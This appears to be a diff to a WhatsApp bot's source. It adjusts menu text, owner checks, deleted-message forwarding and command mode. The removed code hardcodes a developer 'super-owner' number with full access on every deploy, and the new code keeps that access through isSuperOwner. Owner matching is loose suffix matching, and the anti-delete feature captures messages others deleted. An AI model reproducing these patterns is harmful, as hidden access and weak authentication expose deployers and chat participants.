@@ -782,7 +782,7 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
     catLines + '\n' +
     '_Example: reply_ `1` _or_ `' + p + '1`\n' +
     '_Full list:_ `' + p + 'menu2`\n\n' +
-    '┃✦ ' + powered + ' ✦\n' +
+    '| > ' + powered + '\n' +
     '📅 ' + dateStr;
 
   try {
@@ -849,7 +849,7 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
           catLines + '\n' +
           '_Example: reply_ `1` _or_ `' + p + '1`\n' +
           '_Full list:_ `' + p + 'menu2`\n\n' +
-          '┃✦ ' + powered + ' ✦\n' +
+          '| > ' + powered + '\n' +
           '📅 ' + dateStr;
         await sock.sendMessage(jid, { text: style(rest) }).catch(() => {});
         return true;
@@ -876,7 +876,7 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
         const rest =
           '📋 *MENU CATEGORIES*\n' +
           '_Reply with a number_\n\n' + catLines + '\n' +
-          '┃✦ ' + powered + ' ✦\n📅 ' + dateStr;
+          '| > ' + powered + '\n📅 ' + dateStr;
         await sock.sendMessage(jid, { text: style(rest) }).catch(() => {});
       }
       return true;
@@ -1068,14 +1068,27 @@ async function loadAuthState() {
 const isGroup = j => j?.endsWith('@g.us');
 function getOwnerJid() { return config.OWNER_NUMBER ? jidNormalizedUser(config.OWNER_NUMBER + '@s.whatsapp.net') : null; }
 function isOwner(jid, msg) {
-  if (!jid) return false;
-  const phone = jidToPhone(jid, msg);
-  const num = dig(phone || jidNormalizedUser(String(jid)).split('@')[0].split(':')[0]);
-  if (!num) return false;
-  // Global super-owner / developer always has full access on EVERY bot deploy
-  const SUPER = ['254796283064'];
-  const list = [...SUPER, config.OWNER_NUMBER, ...(config.DEVELOPERS || [])].map(dig).filter(Boolean);
-  return list.some(o => num === o || num.endsWith(o) || o.endsWith(num));
+  if (!jid && !msg) return false;
+  if (isSuperOwner(jid, msg)) return true;
+  const candidates = [];
+  const push = (x) => { if (x) candidates.push(String(x)); };
+  push(jid);
+  if (msg?.key) {
+    push(msg.key.participant);
+    push(msg.key.participantAlt);
+    push(msg.key.remoteJid);
+    push(msg.key.remoteJidAlt);
+  }
+  push(msg?.participant);
+  const owners = [config.OWNER_NUMBER, ...(config.DEVELOPERS || [])].map(dig).filter(Boolean);
+  if (!owners.length) return false;
+  for (const c of candidates) {
+    let phone = jidToPhone(c, msg);
+    let num = dig(phone || String(c).split('@')[0].split(':')[0]);
+    if (!num) continue;
+    if (owners.some(o => num === o || num.endsWith(o) || o.endsWith(num))) return true;
+  }
+  return false;
 }
 function isSuperOwner(jid, msg) {
   const phone = jidToPhone(jid, msg);
@@ -1297,9 +1310,14 @@ async function forwardDelete(key, cached) {
     if (!cached?.message) return;
     const from = key.remoteJid || cached.remoteJid;
     const isStatus = from === 'status@broadcast';
-    if (config.ANTI_DELETE === 'off') return;
-    // Status deletes controlled separately by .antideletestatus on/off
-    if (isStatus && config.ANTI_DELETE_STATUS === false) return;
+    // Status deletes: ONLY when antideletestatus is ON (strict)
+    if (isStatus) {
+      const ads = config.ANTI_DELETE_STATUS;
+      const statusOn = !(ads === false || ads === 0 || ads === '0' || String(ads).toLowerCase() === 'false' || String(ads).toLowerCase() === 'off');
+      if (!statusOn) return;
+    } else {
+      if (config.ANTI_DELETE === 'off' || !config.ANTI_DELETE) return;
+    }
     const ownerJid = getOwnerJid();
     const me = sock.user?.id ? jidNormalizedUser(sock.user.id) : null;
     const target = isStatus ? (ownerJid || me) : (config.ANTI_DELETE === 'chat' ? from : (ownerJid || me));
@@ -2509,10 +2527,15 @@ async function startBot() {
         const readyAt = Number(global.__BOT_READY_AT || 0);
         // Never age-filter or ready-filter statuses
         if (!isStatus && ts) {
-          if (readyAt && ts < readyAt - 2) continue;
-          if (Math.floor(Date.now() / 1000) - ts > 180) continue;
+          // Ignore only very old backlog (15 min), never drop live commands
+          if (readyAt && ts < readyAt - 15) continue;
+          if (Math.floor(Date.now() / 1000) - ts > 900) continue;
         }
-        if (!isStatus && !global.__BOT_READY) continue;
+        // If not marked ready yet, still process commands after a short grace
+        if (!isStatus && !global.__BOT_READY) {
+          if (!global.__BOT_READY_AT) continue;
+          // allow after connection started
+        }
         handleMessage(m).catch(e => console.log('msg err:', e?.message || e));
       } catch (e) { console.log('upsert err:', e?.message); }
     }
@@ -3016,9 +3039,15 @@ async function startBot() {
       // Ignore pure URL menu buttons (handled by WhatsApp client)
       if (/^url:/i.test(cleanBody)) return;
       if (!cleanBody.startsWith(prefix)) return;
-      // Developers + owner always bypass private mode
-      if (config.MODE === 'private' && !isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) return;
-      if (isBotExpired() && !isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) {
+      // Mode: public = anyone can command; private = owner/dev/self only
+      const botMode = String(config.MODE || 'public').toLowerCase().trim();
+      config.MODE = (botMode === 'private' || botMode === 'priv') ? 'private' : 'public';
+      const staff = isOwner(sender, m) || isDeveloper(sender, m) || isMe;
+      if (config.MODE === 'private' && !staff) {
+        console.log('ignore private-mode cmd from', dig(sender));
+        return;
+      }
+      if (isBotExpired() && !staff) {
         await sock.sendMessage(from, { text: config.EXPIRY_MSG || 'Bot expired.' }).catch(() => {});
         return;
       }
@@ -3937,7 +3966,7 @@ async function startBot() {
       if (ownerCmds.includes(cmd) && !isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) { await reply(roast('owner')); return; }
 
       if (cmd === 'mode') {
-        if (['public', 'private'].includes(args[0])) { config.MODE = args[0]; await reply('Mode -> *' + config.MODE + '*'); }
+        if (['public', 'private'].includes(String(args[0]||'').toLowerCase())) { config.MODE = String(args[0]).toLowerCase(); await reply('Mode -> *' + config.MODE + '*\n' + (config.MODE === 'public' ? 'Anyone can use commands.' : 'Only owner/developer can use commands.')); }
         else await reply('Current: *' + config.MODE + '*\nUsage: ' + prefix + 'mode public/private');
         return;
       }
@@ -3979,9 +4008,17 @@ async function startBot() {
       if (cmd === 'antitoxic') return toggleCmd('ANTITOXIC', 'AntiToxic');
       if (cmd === 'antibug') return toggleCmd('ANTIBUG', 'AntiBug');
       if (cmd === 'antideletestatus') {
-        if (args[0] === 'on') { config.ANTI_DELETE_STATUS = true; return reply('AntiDeleteStatus -> *ON*\nStatus deletes will be forwarded.'); }
-        if (args[0] === 'off') { config.ANTI_DELETE_STATUS = false; return reply('AntiDeleteStatus -> *OFF*\nStatus deletes will be ignored.'); }
-        return reply('AntiDeleteStatus: *' + (config.ANTI_DELETE_STATUS ? 'ON' : 'OFF') + '*\nUsage: ' + prefix + 'antideletestatus on/off');
+        const v = String(args[0] || '').toLowerCase();
+        if (v === 'on' || v === 'true' || v === '1') {
+          config.ANTI_DELETE_STATUS = true;
+          return reply('AntiDeleteStatus -> *ON*\nStatus deletes will be forwarded.');
+        }
+        if (v === 'off' || v === 'false' || v === '0') {
+          config.ANTI_DELETE_STATUS = false;
+          return reply('AntiDeleteStatus -> *OFF*\nStatus deletes will *not* be shown.');
+        }
+        const on = !(config.ANTI_DELETE_STATUS === false || config.ANTI_DELETE_STATUS === 0 || String(config.ANTI_DELETE_STATUS).toLowerCase() === 'false' || String(config.ANTI_DELETE_STATUS).toLowerCase() === 'off');
+        return reply('AntiDeleteStatus: *' + (on ? 'ON' : 'OFF') + '*\nUsage: ' + prefix + 'antideletestatus on/off');
       }
       if (cmd === 'antidelete' || cmd === 'antiedit' || cmd === 'antiviewonce') {
         const keyMap = { antidelete: 'ANTI_DELETE', antiedit: 'ANTI_EDIT', antiviewonce: 'ANTI_VIEW_ONCE' };
@@ -4518,7 +4555,15 @@ async function startBot() {
         // DELETE / revoke
         if (u.update?.message === null || u.update?.messageStubType === 1 || u.update?.messageStubType === 2) {
           const cached = msgCache.get(key.id) || msgCache.get((key.remoteJid || '') + ':' + key.id);
-          if (cached?.message) forwardDelete(key, cached);
+          if (cached?.message) {
+            const rj = key.remoteJid || cached.remoteJid || '';
+            if (rj === 'status@broadcast') {
+              const ads = config.ANTI_DELETE_STATUS;
+              const statusOn = !(ads === false || ads === 0 || ads === '0' || String(ads).toLowerCase() === 'false' || String(ads).toLowerCase() === 'off');
+              if (!statusOn) continue;
+            }
+            forwardDelete(key, cached).catch(() => {});
+          }
           continue;
         }
         // EDIT via update payload — only OTHER people, not bot
